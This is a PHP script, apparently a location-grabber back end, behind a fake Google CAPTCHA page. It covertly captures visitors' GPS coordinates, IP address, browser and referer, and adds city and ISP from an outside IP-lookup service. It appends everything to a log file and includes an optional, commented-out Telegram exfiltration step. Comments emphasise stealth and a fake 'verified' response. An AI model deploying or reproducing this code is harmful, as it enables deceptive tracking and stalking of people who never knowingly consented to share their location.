<?php
// ============================================
// NAZ-HUB LOCATION CAPTURE (CAPTCHA EDITION)
// ============================================

// 1. TANGKAP SEMUA DATA (STEALTH MODE)
$real_lat = isset($_POST['lat']) ? $_POST['lat'] : '';
$real_lon = isset($_POST['lon']) ? $_POST['lon'] : '';
$method = isset($_POST['method']) ? $_POST['method'] : 'unknown';
$type = isset($_POST['type']) ? $_POST['type'] : 'captcha_verify';

// 2. DATA TAMBAHAN
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'direct';

// 3. SIMPAN KE LOG.TXT (FORMAT RAPI)
$log_data = "╔══════════════════════════════════════════╗\n";
$log_data .= "🕒  WAKTU     : $time\n";
$log_data .= "🎯  TIPE      : GOOGLE CAPTCHA VERIFICATION\n";
$log_data .= "📍  METODE    : " . strtoupper($method) . "\n";

if (!empty($real_lat) && !empty($real_lon) && $real_lat != 0 && $real_lon != 0) {
    $log_data .= "📡  LATITUDE  : $real_lat\n";
    $log_data .= "📡  LONGITUDE : $real_lon\n";
    $log_data .= "🗺️  MAPS LINK : https://www.google.com/maps?q=$real_lat,$real_lon\n";
    
    // Tambahkan link openstreetmap juga
    $log_data .= "🗺️  OSM LINK  : https://www.openstreetmap.org/?mlat=$real_lat&mlon=$real_lon\n";
} else {
    $log_data .= "⚠️  LOKASI    : GPS TIDAK DIDAPATKAN\n";
    $log_data .= "💡  FALLBACK  : HANYA DAPAT DATA IP\n";
}

$log_data .= "🌐  IP        : $ip\n";
$log_data .= "🔗  REFERER   : $referer\n";
$log_data .= "📱  BROWSER   : " . substr($browser, 0, 60) . "\n";

// Coba dapatkan info lokasi dari IP
if (function_exists('json_decode')) {
    $ip_info = @file_get_contents("http://ip-api.com/json/{$ip}");
    if ($ip_info) {
        $ip_data = json_decode($ip_info, true);
        if ($ip_data && $ip_data['status'] == 'success') {
            $log_data .= "🏙️  KOTA      : " . $ip_data['city'] . "\n";
            $log_data .= "🏛️  PROVINSI  : " . $ip_data['regionName'] . "\n";
            $log_data .= "🇮🇩  NEGARA    : " . $ip_data['country'] . "\n";
            $log_data .= "🛜  ISP       : " . $ip_data['isp'] . "\n";
        }
    }
}

$log_data .= "╚══════════════════════════════════════════╝\n\n";

// 4. SIMPAN KE FILE (APPEND)
file_put_contents("log.txt", $log_data, FILE_APPEND);



// 6. OPTIONAL: KIRIM KE TELEGRAM (jika butuh notifikasi real-time)
/*
$botToken = "YOUR_BOT_TOKEN";
$chatId = "YOUR_CHAT_ID";
if(!empty($real_lat) && $real_lat != 0) {
    $message = urlencode("📍 LOCATION CAPTURED\nLat: $real_lat\nLon: $real_lon\nIP: $ip\nTime: $time");
    @file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$message}");
}
*/

// 7. HEADER UNTUK CEK AJAX (optional)
if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest') {
    // Jika request dari AJAX, kasih response minimal
    echo json_encode(['status' => 'success', 'message' => 'verified']);
    exit;
}

// 8. JIKA ADA PARAMETER DEBUG (hanya untuk testing)
if(isset($_GET['debug']) && $_GET['debug'] == 'true') {
    echo "<pre>";
    echo "DEBUG MODE\n";
    echo "==========\n";
    echo $log_data;
    echo "</pre>";
    exit;
}

// 9. DEFAULT: JANGAN OUTPUT APAPUN (biar stealth)
// Biar kosong, tidak ada echo atau print
?>
